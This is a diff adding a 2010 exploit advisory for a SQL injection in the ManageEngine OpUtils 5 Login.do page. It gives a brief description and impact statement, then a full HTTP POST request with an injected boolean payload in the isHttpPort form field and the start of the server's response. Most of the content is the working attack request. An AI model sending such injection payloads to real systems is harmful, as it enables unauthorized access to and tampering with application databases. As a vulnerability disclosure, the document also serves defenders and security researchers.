@@ -1,0 +1,57 @@
+                     ================================================================================
+
+                      ManageEngine OpUtils 5 "Login.DO" SQL Injection Vulnerability
+                     ================================================================================
+
+#Date-3/2/10
+# code by Asheesh kumar Mani Tripathi
+
+#         AKS IT Services
+
+# Credit by Asheesh Anaconda
+
+
+#Download http://www.manageengine.com/products/oputils
+
+#Vulnerbility 
+ManageEngine OpUtils 5 is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query. 
+
+#Impact
+A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database
+
+
+========================================================================================================================
+
+                                                           Request
+========================================================================================================================
+
+POST /Login.do HTTP/1.1
+Host: localhost:7080
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Proxy-Connection: keep-alive
+Referer: http://localhost:7080/Login.do
+Cookie: JSESSIONID=738A4E8130CBE2A0D5E857D9EBF9820E; 32=temp; 83=temp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+
+cookieexists=true&username=asheesh&password=asheesh&logonsubmit=+&log=WARNING&locationUrl=localhost&isHttpPort=false"+and+31337-31337="0
+
+
+
+========================================================================================================================
+                                                          Response
+========================================================================================================================
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=ISO-8859-1
+Date: Wed, 03 Feb 2010 15:24:08 GMT
+Server: Apache-Coyote/1.1
+Content-Length: 20583
+
+
